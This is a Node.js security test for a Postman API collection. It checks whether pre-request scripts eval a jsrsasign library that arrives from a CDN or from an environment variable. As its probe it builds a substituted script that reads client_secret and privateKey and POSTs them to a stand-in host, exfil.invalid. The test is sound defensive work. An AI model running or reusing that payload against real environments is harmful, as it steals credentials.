'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');

const runtime = require('postman-runtime');
const sdk = require('postman-collection');

const REPO_ROOT = path.resolve(__dirname, '..', '..');
const COLLECTION_PATH = path.join(REPO_ROOT, 'Secure Service Account (SSA) API.postman_collection.json');
const ENVIRONMENT_PATH = path.join(REPO_ROOT, 'Secure Service Account (SSA) API.postman_environment.json');

const PLACEHOLDER_CLIENT_ID = 'PLACEHOLDER_CLIENT_ID';
const PLACEHOLDER_CLIENT_SECRET = 'PLACEHOLDER_CLIENT_SECRET';
const PLACEHOLDER_PRIVATE_KEY = 'PLACEHOLDER_PRIVATE_KEY';
const PLACEHOLDER_KID = 'PLACEHOLDER_KID';
const PLACEHOLDER_SSA_ID = 'PLACEHOLDER_SSA_ID';

const EXFIL_URL = 'http://exfil.invalid/collect';
const PROBE_SECRET_KEY = '__probe_client_secret';
const PROBE_KEY_KEY = '__probe_private_key';

// Body substituted for the CDN object. It reads the environment values the
// pre-request script has in scope, then hands them to pm.sendRequest.
const SUBSTITUTED_LIBRARY = [
  '(function () {',
  '  var clientSecret = pm.environment.get("client_secret");',
  '  var privateKey = pm.environment.get("privateKey");',
  '  pm.environment.set("' + PROBE_SECRET_KEY + '", clientSecret);',
  '  pm.environment.set("' + PROBE_KEY_KEY + '", privateKey);',
  '  pm.sendRequest({',
  '    url: "' + EXFIL_URL + '",',
  '    method: "POST",',
  '    header: { "Content-Type": "text/plain" },',
  '    body: { mode: "raw", raw: String(clientSecret) + "\\n" + String(privateKey) }',
  '  });',
  '})();',
  ''
].join('\n');

const trackedRequests = [];

const Requester = runtime.Requester;
Requester.prototype.request = function (id, request, _protocolProfileBehavior, callback) {
  const url = request.url && request.url.toString ? request.url.toString() : '';
  let rawBody = '';

  if (request.body && typeof request.body.toString === 'function') {
    rawBody = request.body.toString();
  }

  trackedRequests.push({ url: url, body: rawBody });

  const isLibraryFetch = url.indexOf('jsrsasign-all-min.js') !== -1;
  const payload = isLibraryFetch ? this._libraryPayload : { code: 200, body: '{}' };
  const response = new sdk.Response({
    code: payload.code,
    status: payload.code === 200 ? 'OK' : 'Error',
    stream: Buffer.from(payload.body, 'utf8'),
    responseTime: 1
  });
  const cookies = new sdk.CookieList(null, []);

  this.emit('response.start.' + id, null, response, request, cookies, {});
  callback(null, response, request, cookies, {});
};

function loadCollection () {
  return new sdk.Collection(JSON.parse(fs.readFileSync(COLLECTION_PATH, 'utf8')));
}

function scriptSource (event) {
  if (!event || !event.script || typeof event.script.toSource !== 'function') {
    return '';
  }

  return event.script.toSource();
}

function eachRequest (collection, visit) {
  collection.forEachItem((item) => {
    visit(item);
  });
}

function isDynamicEval (source) {
  return /\beval\s*\(/.test(source) || /\bnew\s+Function\s*\(/.test(source);
}

function storesResponseBody (source) {
  return source.indexOf('pm.response.text()') !== -1 ||
    source.indexOf('pm.response.stream') !== -1;
}

function classify (collection) {
  const sources = [];
  const sinks = [];

  eachRequest(collection, (item) => {
    const events = item.events && item.events.all ? item.events.all() : [];
    let source = false;
    let sink = false;

    events.forEach((event) => {
      const sourceText = scriptSource(event);

      if (storesResponseBody(sourceText)) {
        source = true;
      }

      if (isDynamicEval(sourceText)) {
        sink = true;
      }
    });

    if (source) {
      sources.push(item);
    }

    if (sink) {
      sinks.push(item);
    }
  });

  return { sources: sources, sinks: sinks };
}

function baseEnvironmentValues () {
  const exported = JSON.parse(fs.readFileSync(ENVIRONMENT_PATH, 'utf8'));
  const values = exported.values.map((entry) => Object.assign({}, entry));

  function upsert (key, value, type) {
    const existing = values.find((entry) => entry.key === key);

    if (existing) {
      existing.value = value;
      existing.enabled = true;

      if (type) {
        existing.type = type;
      }

      return;
    }

    values.push({ key: key, value: value, type: type || 'default', enabled: true });
  }

  upsert('client_id', PLACEHOLDER_CLIENT_ID, 'default');
  upsert('client_secret', PLACEHOLDER_CLIENT_SECRET, 'secret');
  upsert('privateKey', PLACEHOLDER_PRIVATE_KEY, 'secret');
  upsert('kid', PLACEHOLDER_KID, 'default');
  upsert('ssa_id', PLACEHOLDER_SSA_ID, 'default');

  return values;
}

function runItems (items, environmentValues, libraryPayload) {
  const collection = new sdk.Collection({
    info: {
      name: 'cdn-script-execution',
      schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json'
    },
    item: items.map((item) => item.toJSON())
  });
  const environment = new sdk.VariableScope({ values: environmentValues });

  Requester.prototype._libraryPayload = libraryPayload;
  trackedRequests.length = 0;

  const runner = new runtime.Runner();

  return new Promise((resolve, reject) => {
    runner.run(collection, {
      environment: environment,
      timeout: { request: 10000, script: 10000 },
      stopOnError: false
    }, (err, run) => {
      if (err) {
        reject(err);

        return;
      }

      run.start({
        exception (cursor, error) {
          trackedRequests.push({
            url: 'script-exception',
            body: error && (error.message || String(error))
          });
        },
        done (runErr) {
          resolve({
            runError: runErr ? (runErr.message || String(runErr)) : '',
            environment: environment,
            requests: trackedRequests.slice()
          });
        }
      });
    });
  });
}

function leaksFrom (result) {
  const leaks = [];
  const seenSecret = result.environment.get(PROBE_SECRET_KEY);
  const seenKey = result.environment.get(PROBE_KEY_KEY);

  if (seenSecret === PLACEHOLDER_CLIENT_SECRET) {
    leaks.push('environment ' + PROBE_SECRET_KEY + ' received client_secret');
  }

  if (seenKey === PLACEHOLDER_PRIVATE_KEY) {
    leaks.push('environment ' + PROBE_KEY_KEY + ' received privateKey');
  }

  result.requests.forEach((request) => {
    if (request.url.indexOf('exfil.invalid') === -1) {
      return;
    }

    if (request.body.indexOf(PLACEHOLDER_CLIENT_SECRET) !== -1) {
      leaks.push('pm.sendRequest carried client_secret to ' + request.url);
    }

    if (request.body.indexOf(PLACEHOLDER_PRIVATE_KEY) !== -1) {
      leaks.push('pm.sendRequest carried privateKey to ' + request.url);
    }
  });

  return leaks;
}

function summarize (result) {
  return {
    leaks: leaksFrom(result),
    requests: result.requests.map((request) => ({
      url: request.url,
      carriedSecret: request.body.indexOf(PLACEHOLDER_CLIENT_SECRET) !== -1,
      carriedKey: request.body.indexOf(PLACEHOLDER_PRIVATE_KEY) !== -1,
      detail: request.url === 'script-exception' ? request.body : undefined
    })),
    runError: result.runError
  };
}

async function collectFlowLeaks (sources, sinks, libraryPayload, label) {
  const failures = [];

  for (const source of sources) {
    for (const sink of sinks) {
      const result = await runItems(
        [source, sink],
        baseEnvironmentValues(),
        libraryPayload
      );
      const summary = summarize(result);

      if (summary.leaks.length > 0) {
        failures.push({
          label: label,
          source: source.name,
          sink: sink.name,
          summary: summary
        });
      }
    }
  }

  assert.deepEqual(failures, []);
}

test('HTTP 200 CDN body is not executed with the service-account variables', async () => {
  const collection = loadCollection();
  const { sources, sinks } = classify(collection);

  if (sources.length === 0 || sinks.length === 0) {
    return;
  }

  await collectFlowLeaks(sources, sinks, { code: 200, body: SUBSTITUTED_LIBRARY }, 'HTTP 200');
});

test('non-200 CDN body is not stored and later executed', async () => {
  const collection = loadCollection();
  const { sources, sinks } = classify(collection);

  if (sources.length === 0 || sinks.length === 0) {
    return;
  }

  await collectFlowLeaks(sources, sinks, { code: 503, body: SUBSTITUTED_LIBRARY }, 'HTTP 503');
});

test('pre-request scripts do not eval the jsrsasign-js environment value', async () => {
  const collection = loadCollection();
  const { sinks } = classify(collection);

  if (sinks.length === 0) {
    return;
  }

  const values = baseEnvironmentValues();

  values.push({
    key: 'jsrsasign-js',
    value: SUBSTITUTED_LIBRARY,
    type: 'default',
    enabled: true
  });

  const failures = [];

  for (const sink of sinks) {
    const result = await runItems([sink], values, { code: 200, body: '{}' });
    const summary = summarize(result);

    if (summary.leaks.length > 0) {
      failures.push({ sink: sink.name, summary: summary });
    }
  }

  assert.deepEqual(failures, []);
});
